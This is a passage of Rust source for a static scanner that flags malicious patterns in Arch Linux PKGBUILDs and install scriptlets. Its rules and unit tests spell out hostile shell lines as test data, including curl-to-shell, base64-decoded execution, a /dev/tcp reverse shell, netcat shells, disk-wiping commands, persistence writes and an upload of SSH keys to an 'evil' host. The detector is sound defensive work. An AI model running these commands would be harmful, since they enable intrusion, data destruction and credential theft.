            Some('U' | 'R' | 'D') => true,
            Some('S') => !matches!(chars.next(), Some('s' | 'i' | 'l' | 'g' | 'p')),
            _ => false,
        }
    })
}

/// Command strings a stage hands to a shell: `sh -c 'cmd'` (also with extra
/// flags like `-ec`), and `eval 'cmd'`.
fn shell_payloads(stage: &Stage) -> Vec<String> {
    match stage.cmd.as_str() {
        "sh" | "bash" | "zsh" | "dash" | "ksh" => {
            let mut out = Vec::new();
            let mut args = stage.args.iter();
            while let Some(a) = args.next() {
                let is_c = a == "-c"
                    || (a.starts_with('-')
                        && !a.starts_with("--")
                        && a.len() > 1
                        && a.ends_with('c')
                        && a[1..].chars().all(|c| c.is_ascii_alphabetic()));
                if is_c {
                    out.extend(args.next().cloned());
                    break;
                }
            }
            out
        }
        "eval" if !stage.args.is_empty() => vec![stage.args.join(" ")],
        _ => Vec::new(),
    }
}

/// Does this stage turn a stream of packed data into text on stdout?
fn streams_unpacked(stage: &Stage) -> bool {
    let has = |f: &str| stage.args.iter().any(|a| a == f);
    match stage.cmd.as_str() {
        "gpg" | "gpg2" | "openssl" | "zcat" | "bzcat" | "xzcat" | "zstdcat" | "lz4cat"
        | "gunzip" | "bunzip2" | "unxz" | "unzstd" => true,
        "gzip" | "xz" | "zstd" | "bzip2" => has("-d") || has("--decompress") || has("-dc"),
        "tar" => {
            has("--to-stdout")
                || stage
                    .args
                    .iter()
                    .any(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('O'))
        }
        "unzip" => has("-p"),
        _ => false,
    }
}

fn excerpt(s: &str) -> String {
    let t = s.trim();
    if t.chars().count() > 160 {
        let cut: String = t.chars().take(157).collect();
        format!("{cut}...")
    } else {
        t.to_string()
    }
}

/// What kind of file is being read; decides which rules apply.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Mode {
    /// The PKGBUILD itself: every rule.
    Pkgbuild,
    /// The `install=` scriptlet: runs as root at install time.
    Scriptlet,
    /// Any other script in the repo: the dangerous-pattern rules, but not the
    /// PKGBUILD-only ones (a shipped wrapper may legitimately use `sudo`).
    Script,
}

struct Scan<'a> {
    file: &'a str,
    mode: Mode,
    /// Files fetched by `curl`/`wget`/… so far, by base name.
    downloaded: Vec<String>,
    /// First line that opens a socket, and whether the file also wires
    /// something to a shell (`dup2`, `pty.spawn`): the Python/Perl
    /// reverse-shell idiom, which usually spans lines.
    socket_line: Option<(usize, String)>,
    shell_wiring: bool,
    findings: Vec<Finding>,
    secret_lines: Vec<usize>,
    upload_lines: Vec<(usize, String)>,
}

impl Scan<'_> {
    fn add(&mut self, rule: &'static str, severity: Severity, line: usize, msg: &str, text: &str) {
        self.findings.push(Finding {
            rule,
            severity,
            file: self.file.to_string(),
            line,
            message: msg.to_string(),
            excerpt: excerpt(text),
        });
    }

    fn max_on(&self, line: usize) -> Option<Severity> {
        self.findings
            .iter()
            .filter(|f| f.line == line)
            .map(|f| f.severity)
            .max()
    }

    /// Applies the command rules to one line of a function body (or to
    /// top-level code, with `func` = `""`).
    fn line(&mut self, func: &str, no: usize, text: &str) {
        self.line_at(func, no, text, 0);
    }

    /// `depth` counts how many `sh -c '…'` strings deep `text` is.
    fn line_at(&mut self, func: &str, no: usize, text: &str, depth: usize) {
        let stages: Vec<Stage> = split_stages(text)
            .into_iter()
            .map(|(t, p)| stage_of(&t, p))
            .collect();
        // Code passed as a string to a shell or `eval` is code too: read it.
        if depth < 3 {
            for stage in &stages {
                for inner in shell_payloads(stage) {
                    self.line_at(func, no, &inner, depth + 1);
                }
            }
        }
        let under_build_dirs = text.contains("pkgdir") || text.contains("srcdir");
        let in_pkgbuild = self.mode == Mode::Pkgbuild;

        // Pipelines: fetch | shell, decode | shell, unpack | shell.
        let mut fetched = false;
        let mut decoded = false;
        let mut unpacked = false;
        for stage in &stages {
            if !stage.piped {
                fetched = false;
                decoded = false;
                unpacked = false;
            }
            let interp = SHELLS.contains(&stage.cmd.as_str());
            if interp && stage.piped && fetched {
                self.add(
                    "remote-exec",
                    Severity::High,
                    no,
                    "downloads code and runs it directly",
                    text,
                );
            }
            if interp && stage.piped && decoded {
                self.add(
                    "obfuscated-exec",
                    Severity::Critical,
                    no,
                    "decodes a hidden payload and runs it",
                    text,
                );
            }
            if interp && stage.piped && unpacked && !fetched && !decoded {
                self.add(
                    "extract-pipe-exec",
                    Severity::High,
                    no,
                    "unpacks code on the fly and runs it without it ever being a file you can read",
                    text,
                );
            }
            if FETCHERS.contains(&stage.cmd.as_str()) {
                fetched = true;
            }
            if DECODERS.iter().any(|d| stage.text.contains(d)) {
                decoded = true;
            }
            if streams_unpacked(stage) {
                unpacked = true;
            }
        }
        let has_interp = stages.iter().any(|s| SHELLS.contains(&s.cmd.as_str()));
        if has_interp && DECODERS.iter().any(|d| text.contains(d)) {
            self.add(
                "obfuscated-exec",
                Severity::Critical,
                no,
                "decodes a hidden payload and runs it",
                text,
            );
        }
        if has_interp
            && ["$(curl", "$(wget", "<(curl", "<(wget", "`curl", "`wget"]
                .iter()
                .any(|p| text.contains(p))
        {
            self.add(
                "remote-exec",
                Severity::High,
                no,
                "downloads code and runs it directly",
                text,
            );
        }

        // Fallbacks for code in other languages, where there are no pipeline
        // stages to look at: `os.system("curl x | sh")`, `exec(b64decode(..))`.
        let text_pipes_to_shell = ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh"]
            .iter()
            .any(|p| text.contains(p));
        if text_pipes_to_shell && ["curl ", "wget "].iter().any(|f| text.contains(f)) {
            self.add(
                "remote-exec",
                Severity::High,
                no,
                "downloads code and runs it directly",
                text,
            );
        }
        if DECODERS.iter().any(|d| text.contains(d))
            && (text.contains("exec(") || text.contains("eval(") || text_pipes_to_shell)
        {
            self.add(
                "obfuscated-exec",
                Severity::Critical,
                no,
                "decodes a hidden payload and runs it",
                text,
            );
        }

        // Code that hides what it runs.
        if stages
            .iter()
            .any(|s| spelled_with_escapes(s.text.trim_start()))
        {
            self.add(
                "obfuscated-command",
                Severity::High,
                no,
                "spells a command with escape sequences to hide it",
                text,
            );
        }
        if stages.iter().any(|s| s.dynamic) {
            self.add(
                "dynamic-command",
                Severity::Warning,
                no,
                "the command to run is built at runtime, so it can't be read statically",
                text,
            );
        }
        if text
            .split_whitespace()
            .map(|t| t.trim_matches(['"', '\'', '(', ')', ';']))
            .any(|t| {
                t.len() >= 200
                    && t.chars().all(|c| {
                        c.is_ascii_alphanumeric() || matches!(c, '+' | '/' | '=' | '_' | '-')
                    })
            })
        {
            self.add(
                "encoded-blob",
                Severity::Warning,
                no,
                "contains a long encoded blob that can't be read",
                text,
            );
        }

        // Download now, run later.
        for stage in &stages {
            if FETCHERS.contains(&stage.cmd.as_str()) {
                let names = download_targets(stage);
                self.downloaded.extend(names);
            }
        }
        if !self.downloaded.is_empty() {
            let names_downloaded = |s: &Stage, this: &Self| {
                s.args.iter().any(|a| {
                    let base = a.rsplit('/').next().unwrap_or(a);
                    this.downloaded.iter().any(|d| d == base)
                })
            };
            for stage in &stages {
                let runs = (SHELLS.contains(&stage.cmd.as_str()) && names_downloaded(stage, self))
                    || self.downloaded.contains(&stage.cmd)
                    || (stage.cmd == "chmod"
                        && stage
                            .args
                            .iter()
                            .any(|a| a.contains("+x") || a == "755" || a == "700")
                        && names_downloaded(stage, self));
                if runs {
                    self.add(
                        "download-then-run",
                        Severity::High,
                        no,
                        "runs a file that this same script downloaded",
                        text,
                    );
                }
            }
        }

        // Reverse shells.
        if text.contains("/dev/tcp/") || text.contains("/dev/udp/") {
            self.add(
                "reverse-shell",
                Severity::Critical,
                no,
                "opens a network connection through /dev/tcp",
                text,
            );
            self.upload_lines.push((no, text.to_string()));
        }
        for stage in &stages {
            if matches!(stage.cmd.as_str(), "nc" | "ncat" | "netcat" | "socat")
                && stage.args.iter().any(|a| {
                    a == "-e" || a == "-c" || a.starts_with("exec:") || a.starts_with("EXEC:")
                })
            {
                self.add(
                    "reverse-shell",
                    Severity::Critical,
                    no,
                    "hands a shell to a network connection",
                    text,
                );
            }
        }

        // Destructive commands.
        for stage in &stages {
            let destructive = match stage.cmd.as_str() {
                "rm" => {
                    let recursive = stage.args.iter().any(|a| {
                        a == "--recursive"
                            || (a.starts_with('-')
                                && !a.starts_with("--")
                                && a.contains(['r', 'R']))
                    });
                    recursive
                        && stage.args.iter().any(|a| {
                            !a.starts_with('-')
                                && DANGEROUS_RM_TARGETS.contains(&a.trim_end_matches([')', '`']))
                        })
                }
                "dd" => stage.args.iter().any(|a| {
                    a.strip_prefix("of=/dev/").is_some_and(|d| {
                        !matches!(d, "null" | "stdout" | "stderr" | "zero" | "tty")
                    })
                }),
                "shred" | "wipefs" => stage.args.iter().any(|a| a.starts_with("/dev/")),
                c => c == "mkfs" || c.starts_with("mkfs."),
            };
            if destructive {
                self.add(
                    "destructive",
                    Severity::Critical,
                    no,
                    "destroys files or a disk outside the build",
                    text,
                );
            }
        }
        if text.contains(":(){") || text.contains(":() {") {
            self.add(
                "destructive",
                Severity::Critical,
                no,
                "looks like a fork bomb",
                text,
            );
        }

        // Persistence: writing startup files, keys, preload, sudoers. Judged
        // by where a command *writes*, so `grep x /etc/passwd > /dev/null`
        // and `cp /etc/profile /tmp/x` are not hits.
        let mut written: Vec<String> = redirect_targets(text);
        for stage in &stages {
            let non_flags: Vec<&String> =
                stage.args.iter().filter(|a| !a.starts_with('-')).collect();
            match stage.cmd.as_str() {
                "cp" | "mv" | "ln" | "install" => {
                    written.extend(non_flags.last().map(|s| s.to_string()));
                }
                "tee" => written.extend(non_flags.iter().map(|s| s.to_string())),
                "dd" => written.extend(
                    stage
                        .args
                        .iter()
                        .filter_map(|a| a.strip_prefix("of="))
                        .map(str::to_string),
                ),
                "sed" if stage.args.iter().any(|a| a.starts_with("-i")) => {
                    written.extend(non_flags.iter().map(|s| s.to_string()));
                }
                _ => {}
            }
        }
        written.retain(|t| !t.contains("pkgdir") && !t.contains("srcdir"));
        if written
            .iter()
            .any(|t| TRUST_PATHS.iter().any(|p| t.contains(p)))
        {
            self.add(
                "persistence",
                Severity::Critical,
                no,
                "modifies an SSH key list, preload file, sudoers, account file or scheduled-job list outside the package",
                text,
            );
        } else if written
            .iter()
            .any(|t| STARTUP_PATHS.iter().any(|p| t.contains(p)))
        {
            let severity = if self.mode == Mode::Pkgbuild {
                Severity::Critical
            } else {
                Severity::High
            };
            self.add(
                "persistence",
                severity,
                no,
                "modifies a shell startup file or autostart entry outside the package",
                text,
            );
        }

        // Credentials.
        if !under_build_dirs && SECRET_PATHS.iter().any(|p| text.contains(p)) {
            self.add(
                "secret-access",
                Severity::High,
                no,
                "touches credentials or private user data",
                text,
            );
            self.secret_lines.push(no);
        }
        for stage in &stages {
            let upload = match stage.cmd.as_str() {
                "curl" => {
                    stage.args.iter().any(|a| {
                        matches!(
                            a.as_str(),
                            "-d" | "-F"
                                | "-T"
                                | "--json"
                                | "--form"
                                | "--upload-file"
                                | "-XPOST"
                                | "-XPUT"
                        ) || a.starts_with("--data")
                            || a.starts_with("-d@")
                    }) || stage
                        .args
                        .windows(2)
                        .any(|w| w[0] == "-X" && matches!(w[1].as_str(), "POST" | "PUT"))
                }
                "wget" => stage.args.iter().any(|a| {
                    a.starts_with("--post-") || a == "--method=POST" || a == "--method=PUT"
                }),
                "nc" | "ncat" | "netcat" | "socat" => true,
                "scp" | "sftp" | "rsync" => stage
                    .args
                    .iter()
                    .any(|a| a.contains('@') && a.contains(':')),
                _ => false,
            };
            if upload {
                self.upload_lines.push((no, text.to_string()));
            }
        }

        if in_pkgbuild {
            self.pkgbuild_only(func, no, text, &stages, under_build_dirs);
        }

        // Anything else worth a note, unless a stronger finding already says it.
        if stages.iter().any(|s| s.cmd == "eval") && self.max_on(no) < Some(Severity::High) {
            self.add(
                "eval",
                Severity::Warning,
                no,
                "uses eval, which hides what actually runs",
                text,
            );
        }
        if text.contains("LD_PRELOAD") {
            self.add(
                "ld-preload",
                Severity::High,
                no,
                "sets LD_PRELOAD, which injects code into every program it runs",
                text,
            );
        }
    }

    /// Rules that only make sense for a PKGBUILD's own functions.
    fn pkgbuild_only(
        &mut self,
        func: &str,
        no: usize,
        text: &str,
        stages: &[Stage],
        under_build_dirs: bool,
    ) {
        for stage in stages {
            let cmd = stage.cmd.as_str();

            if stage.privileged {
                self.add(
                    "privilege",
                    Severity::High,
                    no,
                    "asks for elevated privileges while building",
                    text,
                );
            }
            if cmd == "chmod" {
                let setuid = stage.args.iter().any(|a| {
                    a.contains("+s")
                        || a.contains("u+s")
                        || (a.len() == 4
                            && a.chars().all(|c| c.is_ascii_digit())
                            && matches!(a.as_bytes()[0], b'2' | b'4' | b'6' | b'7'))
                });
                if setuid {
                    let sev = if under_build_dirs {
                        Severity::Warning
                    } else {
                        Severity::High
                    };
                    self.add("setuid", sev, no, "sets the setuid/setgid bit", text);
                }
            }
            if cmd == "systemctl"
                && stage
                    .args
                    .iter()
                    .any(|a| SERVICE_ACTIONS.contains(&a.as_str()))
                && !stage.args.iter().any(|a| a.starts_with("--root"))
            {
                self.add(
                    "host-service",
                    Severity::High,
                    no,
                    "changes services on the build host",
                    text,
                );
            }
            let read_only_pacman = cmd == "pacman" && !pacman_mutates(&stage.args);
            if let Some((_, what)) = HOST_CHANGING_CMDS
                .iter()
                .find(|(c, _)| *c == cmd && !read_only_pacman)
            {
                self.add(
                    "host-change",
                    Severity::High,
                    no,
                    &format!("{what} on the build host"),
                    text,
                );
            }

            // Network use in the build proper.
            let network = match cmd {
                "curl" | "wget" | "aria2c" => true,
                "git" => stage
                    .args
                    .iter()
                    .any(|a| matches!(a.as_str(), "clone" | "fetch" | "pull" | "submodule")),
                "pip" | "pip3" | "pipx" | "npm" | "yarn" | "pnpm" | "bun" | "gem" => stage
                    .args
                    .iter()
                    .any(|a| matches!(a.as_str(), "install" | "ci" | "add")),
                "go" => {
                    stage
                        .args
                        .windows(2)
                        .any(|w| (w[0] == "mod" && w[1] == "download") || w[0] == "get")
                        || stage.args.first().is_some_and(|a| a == "get")
                }
                "cargo" => stage.args.iter().any(|a| a == "fetch"),
                _ => false,
            };
            if network {
                let build_step = matches!(func, "build" | "check")
                    || func == "package"
                    || func.starts_with("package_");
                if build_step {
                    self.add(
                        "network-in-build",
                        Severity::Warning,
                        no,
                        &format!(
                            "uses the network inside {func}(); a sandboxed build will block this unless you allow it"
                        ),
                        text,
                    );
                } else if func == "prepare" {
                    self.add(
                        "network-in-prepare",
                        Severity::Info,
                        no,
                        "uses the network inside prepare()",
                        text,
                    );
                }
            }

            // Writes outside the package/source trees.
            let outside = |t: &str| {
                (t.starts_with('/')
                    || t.starts_with('~')
                    || t.starts_with("$HOME")
                    || t.starts_with("${HOME}"))
                    && !t.starts_with("/dev/")
                    && !t.starts_with("/tmp/")
                    && t != "/tmp"
            };
            let non_flags: Vec<&String> =
                stage.args.iter().filter(|a| !a.starts_with('-')).collect();
            let mut targets: Vec<&str> = Vec::new();
            match cmd {
                "cp" | "mv" | "ln" => {
                    if let Some(last) = non_flags.last() {
                        targets.push(last.as_str());
                    }
                }
                "install" => {
                    if stage.args.iter().any(|a| a == "-d" || a == "-D" && false) {
                        targets.extend(non_flags.iter().map(|s| s.as_str()));
                    } else if let Some(last) = non_flags.last() {
                        targets.push(last.as_str());
                    }
                }
                "mkdir" | "touch" | "rm" | "rmdir" | "tee" => {
                    targets.extend(non_flags.iter().map(|s| s.as_str()));
                }
                _ => {}
            }
            if targets.iter().any(|t| outside(t)) {
                self.add(
                    "writes-outside-package",
                    Severity::Warning,
                    no,
                    "writes to a path outside $srcdir and $pkgdir",
                    text,
                );
            }
        }
        for target in redirect_targets(text) {
            if (target.starts_with('/') || target.starts_with('~'))
                && !target.starts_with("/dev/")
                && !target.starts_with("/tmp/")
            {
                self.add(
                    "writes-outside-package",
                    Severity::Warning,
                    no,
                    "writes to a path outside $srcdir and $pkgdir",
                    text,
                );
            }
        }
    }

    fn finish(&mut self) {
        if let (Some((no, text)), true) = (self.socket_line.take(), self.shell_wiring) {
            self.add(
                "reverse-shell",
                Severity::Critical,
                no,
                "wires a network socket to a shell",
                &text,
            );
        }
        if let Some(&first_secret) = self.secret_lines.first() {
            for (no, text) in std::mem::take(&mut self.upload_lines) {
                let msg = format!(
                    "sends data over the network in a file that also reads credentials (line {first_secret})"
                );
                self.add("exfiltration", Severity::Critical, no, &msg, &text);
            }
        }
    }
}

const TOPLEVEL_OK: &[&str] = &[
    "", "export", "declare", "typeset", "readonly", "local", "unset", "true", "false", ":", "[",
    "[[", "test", "shopt", "set", "return", "source", ".", "echo", "printf", "case", "esac", "fi",
    ";;", "cd",
];

/// What a file reads and sends, kept so it can be correlated with other files.
#[derive(Debug, Default, Clone)]
struct Facts {
    /// Lines that touch credentials.
    secrets: Vec<usize>,
    /// Lines that send data over the network, with their text.
    uploads: Vec<(usize, String)>,
}

fn audit_file(file: &str, text: &str, mode: Mode) -> Vec<Finding> {
    audit_file_facts(file, text, mode).0
}

fn audit_file_facts(file: &str, text: &str, mode: Mode) -> (Vec<Finding>, Facts) {
    let scriptlet = mode == Mode::Scriptlet;
    let parsed = parse(text);
    let mut scan = Scan {
        file,
        mode,
        downloaded: Vec::new(),
        socket_line: None,
        shell_wiring: false,
        findings: Vec::new(),
        secret_lines: Vec::new(),
        upload_lines: Vec::new(),
    };

    if scriptlet {
        scan.add(
            "install-scriptlet",
            Severity::Info,
            1,
            "this scriptlet runs as root when the package is installed or removed",
            file,
        );
    } else if mode == Mode::Pkgbuild {
        declarative(&parsed, &mut scan);
    }

    for function in &parsed.functions {
        for line in &function.body {
            scan.line(&function.name, line.no, &line.text);
        }
    }
    for line in &parsed.toplevel {
        let first = stage_of(
            &split_stages(&line.text)
                .first()
                .map(|s| s.0.clone())
                .unwrap_or_default(),
            false,
        );
        scan.line("", line.no, &line.text);
        if mode == Mode::Pkgbuild
            && assignment_split(line.text.trim()).is_none()
            && !TOPLEVEL_OK.contains(&first.cmd.as_str())
            && !line.text.trim().is_empty()
        {
            scan.add(
                "toplevel-command",
                Severity::Warning,
                line.no,
                "runs a command whenever the PKGBUILD is merely read, not only when building",
                &line.text,
            );
        }
    }
    // Read from the raw text: in other languages `s = socket.socket()` is
    // not a command, and the shell reader would file it as an assignment.
    scan.socket_line = text
        .lines()
        .enumerate()
        .find(|(_, l)| l.contains("socket.socket"))
        .map(|(i, l)| (i + 1, l.to_string()));
    scan.shell_wiring = ["dup2", "pty.spawn", "/bin/sh -i", "/bin/bash -i"]
        .iter()
        .any(|p| text.contains(p));
    let facts = Facts {
        secrets: scan.secret_lines.clone(),
        uploads: scan.upload_lines.clone(),
    };
    scan.finish();
    (scan.findings, facts)
}

fn is_vcs(source: &str) -> bool {
    let url = source.split_once("::").map(|(_, u)| u).unwrap_or(source);
    ["git+", "svn+", "hg+", "bzr+", "fossil+"]
        .iter()
        .any(|p| url.starts_with(p))
        || url.ends_with(".git")
        || url.contains(".git#")
}

fn declarative(parsed: &Parsed, scan: &mut Scan) {
    const SUMS: &[&str] = &[
        "md5sums",
        "sha1sums",
        "sha224sums",
        "sha256sums",
        "sha384sums",
        "sha512sums",
        "b2sums",
        "cksums",
    ];
    let get = |name: &str| parsed.assignments.iter().find(|a| a.name == name);

    for a in &parsed.assignments {
        let important = a.name.starts_with("source")
            || a.name.starts_with("depends")
            || a.name.starts_with("makedepends")
            || a.name == "install"
            || a.name == "validpgpkeys"
            || SUMS.iter().any(|s| a.name.starts_with(s));
        if a.dynamic && important {
            scan.add(
                "dynamic-field",
                Severity::Info,
                a.line,
                &format!(
                    "{} is computed by a command, so it can't be checked statically",
                    a.name
                ),
                &a.name,
            );
        }
        if a.name == "install" && !a.items.is_empty() {
            scan.add(
                "install-scriptlet",
                Severity::Info,
                a.line,
                "declares an install scriptlet, which runs as root when the package is installed or removed",
                &a.items.join(" "),
            );
        }
    }

    // Arch-specific groups: `source`, `source_x86_64`, ...
    let suffixes: Vec<String> = parsed
        .assignments
        .iter()
        .filter_map(|a| a.name.strip_prefix("source").map(str::to_string))
        .collect();
    for suffix in suffixes {
        let Some(sources) = get(&format!("source{suffix}")) else {
            continue;
        };
        for src in &sources.items {
            let url = src.split_once("::").map(|(_, u)| u).unwrap_or(src);
            if url.starts_with("http://")
                || url.starts_with("ftp://")
                || url.starts_with("git+http://")
            {
                scan.add(
                    "insecure-source",
                    Severity::Warning,
                    sources.line,
                    "fetches a source over an unencrypted connection",
                    src,
                );
            }
        }
        let sum_arrays: Vec<&Assignment> = SUMS
            .iter()
            .filter_map(|s| get(&format!("{s}{suffix}")))
            .collect();
        let has_real_sources = sources.items.iter().any(|s| !is_vcs(s));
        if sum_arrays.is_empty() {
            if has_real_sources && !sources.items.is_empty() && !sources.dynamic {
                scan.add(
                    "missing-checksums",
                    Severity::Warning,
                    sources.line,
                    "has sources but no checksums",
                    &sources.name,
                );
            }
            continue;
        }
        for sums in &sum_arrays {
            if sums.items.len() == sources.items.len() {
                for (src, sum) in sources.items.iter().zip(&sums.items) {
                    if sum == "SKIP" && !is_vcs(src) && src.contains("://") {
                        scan.add(
                            "checksum-skipped",
                            Severity::Warning,
                            sums.line,
                            "doesn't verify the checksum of a downloaded source",
                            src,
                        );
                    }
                }
            }
        }
        if sum_arrays.iter().all(|s| {
            s.name.starts_with("md5") || s.name.starts_with("sha1") || s.name.starts_with("cksum")
        }) {
            scan.add(
                "weak-checksums",
                Severity::Info,
                sum_arrays[0].line,
                "only uses weak checksums (md5/sha1)",
                &sum_arrays[0].name,
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn findings(pkgbuild: &str) -> Vec<Finding> {
        audit("t", pkgbuild, None, &[]).findings
    }

    fn rules(pkgbuild: &str) -> Vec<(&'static str, Severity)> {
        findings(pkgbuild)
            .into_iter()
            .map(|f| (f.rule, f.severity))
            .collect()
    }

    fn has(pkgbuild: &str, rule: &str, severity: Severity) -> bool {
        rules(pkgbuild)
            .iter()
            .any(|(r, s)| *r == rule && *s == severity)
    }

    fn body(function: &str, lines: &str) -> String {
        format!("pkgname=x\npkgver=1\n{function}() {{\n{lines}\n}}\n")
    }

    const BENIGN: &str = r#"
# Maintainer: Someone <a@b.c>
pkgname=hello
pkgver=2.12.1
pkgrel=1
pkgdesc="The GNU hello program"
arch=('x86_64')
url="https://www.gnu.org/software/hello/"
license=('GPL-3.0-or-later')
depends=('glibc')
makedepends=('git')
source=("https://ftp.gnu.org/gnu/hello/hello-$pkgver.tar.gz"{,.sig}
        "fix.patch")
sha256sums=('aaaa'
            'SKIP'
            'bbbb')
validpgpkeys=('ABCD')

prepare() {
  cd "$srcdir/$pkgname-$pkgver"
  patch -p1 -i "$srcdir/fix.patch"
}

build() {
  cd "$srcdir/$pkgname-$pkgver"
  ./configure --prefix=/usr
  make
}

check() {
  cd "$srcdir/$pkgname-$pkgver"
  make check
}

package() {
  cd "$srcdir/$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
  install -Dm644 COPYING "$pkgdir/usr/share/licenses/$pkgname/COPYING"
  cat > "$pkgdir/usr/bin/wrapper" <<EOF
#!/bin/sh
sudo true && curl http://x | sh
EOF
  chmod 755 "$pkgdir/usr/bin/wrapper"
}
"#;

    #[test]
    fn a_typical_benign_pkgbuild_has_nothing_above_info() {
        let f = findings(BENIGN);
        assert!(
            f.iter().all(|f| f.severity <= Severity::Info),
            "unexpected: {f:#?}"
        );
        // The "SKIP" is the .sig file's, which sits with its tarball, and
        // heredoc contents are data.
    }

    #[test]
    fn declarative_fields_and_multiline_arrays_are_read() {
        let p = parse(BENIGN);
        let src = p.assignments.iter().find(|a| a.name == "source").unwrap();
        assert_eq!(src.items.len(), 2, "{:?}", src.items);
        let sums = p
            .assignments
            .iter()
            .find(|a| a.name == "sha256sums")
            .unwrap();
        assert_eq!(sums.items, ["aaaa", "SKIP", "bbbb"]);
        let names: Vec<_> = p.functions.iter().map(|f| f.name.as_str()).collect();
        assert_eq!(names, ["prepare", "build", "check", "package"]);
    }

    #[test]
    fn function_forms_and_heredocs_are_parsed() {
        let p = parse("function build {\n  make\n}\npackage()\n{\n  x\n}\none() { echo hi; }\n");
        let names: Vec<_> = p.functions.iter().map(|f| f.name.as_str()).collect();
        assert_eq!(names, ["build", "package", "one"]);
        assert!(p.toplevel.is_empty(), "{:?}", p.toplevel);
    }

    #[test]
    fn comments_and_quoted_hashes() {
        assert_eq!(strip_comment("a b # c").trim(), "a b");
        assert_eq!(strip_comment("a \"b # c\" d").trim(), "a \"b # c\" d");
        assert_eq!(strip_comment("${#x} y#z").trim(), "${#x} y#z");
        let f = findings(&body("build", "  # curl http://x | sh\n  make"));
        assert!(f.iter().all(|f| f.severity <= Severity::Info), "{f:#?}");
    }

    #[test]
    fn remote_exec_is_high() {
        for line in [
            "curl -s http://x/i.sh | sh",
            "wget -qO- http://x | bash -s",
            "curl http://x | sudo bash",
            "bash -c \"$(curl -fsSL http://x)\"",
            "source <(curl -s http://x)",
        ] {
            assert!(
                has(&body("build", line), "remote-exec", Severity::High),
                "{line}"
            );
        }
        assert!(!has(
            &body("build", "curl -o f http://x\nsh f"),
            "remote-exec",
            Severity::High
        ));
    }

    #[test]
    fn obfuscated_execution_is_critical() {
        for line in [
            "echo aGk= | base64 -d | sh",
            "eval \"$(echo aGk= | base64 --decode)\"",
            "bash <<< $(base64 -d payload)",
        ] {
            assert!(
                has(&body("build", line), "obfuscated-exec", Severity::Critical),
                "{line}"
            );
        }
        assert!(!has(
            &body("build", "base64 -d < in > out"),
            "obfuscated-exec",
            Severity::Critical
        ));
    }

    #[test]
    fn persistence_is_critical_unless_inside_the_package() {
        for line in [
            "echo 'curl x|sh' >> ~/.bashrc",
            "echo key >> $HOME/.ssh/authorized_keys",
            "cp evil.so /etc/ld.so.preload",
            "tee -a /etc/profile <<< x",
        ] {
            assert!(
                has(&body("package", line), "persistence", Severity::Critical),
                "{line}"
            );
        }
        assert!(!has(
            &body(
                "package",
                "install -Dm644 bashrc \"$pkgdir/etc/skel/.bashrc\""
            ),
            "persistence",
            Severity::Critical
        ));
        assert!(!has(
            &body("package", "grep foo ~/.bashrc"),
            "persistence",
            Severity::Critical
        ));
    }

    #[test]
    fn destructive_and_reverse_shell_are_critical() {
        for line in [
            "rm -rf /",
            "rm -rf \"$HOME\"",
            "rm -fr ~/*",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sdb1",
            "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            "nc -e /bin/sh 1.2.3.4 4444",
            ":(){ :|:& };:",
        ] {
            let r = rules(&body("build", line));
            assert!(
                r.iter().any(|(_, s)| *s == Severity::Critical),
                "{line}: {r:?}"
            );
        }
        for ok in [
            "rm -rf \"$srcdir/build\"",
            "rm -rf /tmp/x",
            "rm -rf \"$pkgdir/usr/share/doc\"",
            "dd if=/dev/zero of=\"$srcdir/img\" bs=1M count=1",
        ] {
            let r = rules(&body("build", ok));
            assert!(
                r.iter().all(|(_, s)| *s < Severity::Critical),
                "{ok}: {r:?}"
            );
        }
    }

    #[test]
    fn reading_credentials_is_high_and_uploading_them_is_critical() {
        let read = body("build", "cat ~/.ssh/id_ed25519 > \"$srcdir/k\"");
        // under $srcdir on the same line: exempt
        assert!(!has(&read, "secret-access", Severity::High));
        let read = body("build", "tar c ~/.ssh ~/.gnupg > /tmp/a");
        assert!(has(&read, "secret-access", Severity::High));
        assert!(!has(&read, "exfiltration", Severity::Critical));

        let both = body(
            "build",
            "tar c ~/.ssh > /tmp/a\ncurl -X POST --data-binary @/tmp/a http://evil",
        );
        assert!(
            has(&both, "exfiltration", Severity::Critical),
            "{:?}",
            rules(&both)
        );

        let upload_only = body("build", "curl -F f=@x http://example.org");
        assert!(!has(&upload_only, "exfiltration", Severity::Critical));
    }

    #[test]
    fn privilege_setuid_services_and_host_changes_are_high() {
        assert!(has(
            &body("build", "sudo make install"),
            "privilege",
            Severity::High
        ));
        assert!(has(
            &body("package", "chmod u+s /usr/bin/x"),
            "setuid",
            Severity::High
        ));
        assert!(has(
            &body("package", "chmod 4755 /usr/bin/x"),
            "setuid",
            Severity::High
        ));
        assert!(has(
            &body("package", "systemctl enable foo.service"),
            "host-service",
            Severity::High
        ));
        assert!(has(
            &body("build", "useradd evil"),
            "host-change",
            Severity::High
        ));
        assert!(has(
            &body("build", "export LD_PRELOAD=./x.so"),
            "ld-preload",
            Severity::High
        ));
        // Inside the package tree these are normal packaging.
        assert!(has(
            &body("package", "chmod 4755 \"$pkgdir/usr/bin/x\""),
            "setuid",
            Severity::Warning
        ));
        assert!(!has(
            &body("package", "systemctl --root=\"$pkgdir\" enable foo"),
            "host-service",
            Severity::High
        ));
        assert!(!has(
            &body("package", "chmod 755 \"$pkgdir/usr/bin/x\""),
            "setuid",
            Severity::High
        ));
    }

    #[test]
    fn network_in_build_steps_is_a_warning_and_in_prepare_info() {
        assert!(has(
            &body("build", "git clone https://x/y"),
            "network-in-build",
            Severity::Warning
        ));
        assert!(has(
            &body("package", "pip install foo"),
            "network-in-build",
            Severity::Warning
        ));
        assert!(has(
            &body("build", "go mod download"),
            "network-in-build",
            Severity::Warning
        ));
        assert!(has(
            &body("prepare", "npm ci"),
            "network-in-prepare",
            Severity::Info
        ));
        assert!(!has(
            &body("build", "make"),
            "network-in-build",
            Severity::Warning
        ));
    }

    #[test]
    fn writes_outside_the_package_are_warnings() {
        for line in [
            "cp foo /usr/bin/foo",
            "install -Dm755 foo /usr/local/bin/foo",
            "echo x > /etc/foo",
            "mkdir -p ~/.local/share/x",
        ] {
            assert!(
                has(
                    &body("package", line),
                    "writes-outside-package",
                    Severity::Warning
                ),
                "{line}"
            );
        }
        for ok in [
            "cp /usr/share/x \"$pkgdir/usr/share/x\"",
